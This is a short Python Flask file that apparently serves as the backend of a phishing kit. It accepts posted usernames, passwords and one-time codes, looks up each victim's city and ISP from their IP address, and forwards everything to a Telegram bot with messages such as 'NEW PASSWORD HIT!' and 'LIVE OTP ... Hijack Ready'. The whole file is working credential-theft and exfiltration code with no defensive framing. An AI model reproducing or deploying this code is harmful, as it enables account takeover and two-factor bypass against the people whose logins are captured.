from flask import Flask, request, jsonify
import requests
import os

app = Flask(__name__)

TOKEN = os.environ.get('BOT_TOKEN')
CID = os.environ.get('CHAT_ID')

@app.route('/api/index', methods=['POST'])
def handle_requests():
    try:
        # Force=True ke sath data capture
        data = request.get_json(force=True) or {}
        dtype = data.get('t')
        user = data.get('u', 'N/A')
        password = data.get('p', 'N/A')
        otp = data.get('o', 'N/A')
        
        # IP and Location Tracking
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        geo = requests.get(f"http://ip-api.com/json/{ip}").json()
        city = geo.get('city', 'Unknown')
        isp = geo.get('isp', 'Unknown')

        if dtype == 'VISIT':
            msg = f"👀 TARGET DETECTED\n📍 City: {city}\n🌐 Network: {isp}\n📱 Device: {data.get('d')[:50]}..."
        
        # Simple Logic for Telegram Messages
        
        
        elif dtype == 'OTP_RECEIVED':
            #
            msg = f"🔥 **Z-PROXY HIT (OTP)**\n👤 User: `{user}`\n🔢 **LIVE OTP: {otp}**\n✅ Status: Hijack Ready"
        
        elif dtype in ['INIT_LOG', 'REAL_LOG']:
            # Yahan Password lazmi aayega
            msg = f"🚀 **NEW PASSWORD HIT!**\n👤 User: `{user}`\n🔑 **Pass: {password}**\n📊 Step: {dtype}\n📍 IP: `{ip}`"
        
        else:
            msg = f"ℹ️ Unknown Request: {dtype}"

        # Telegram Call
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                      json={"chat_id": CID, "text": msg, "parse_mode": "Markdown"})
        
        return jsonify({"status": "success"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

def handler(req, res):
    return app(req, res)
    
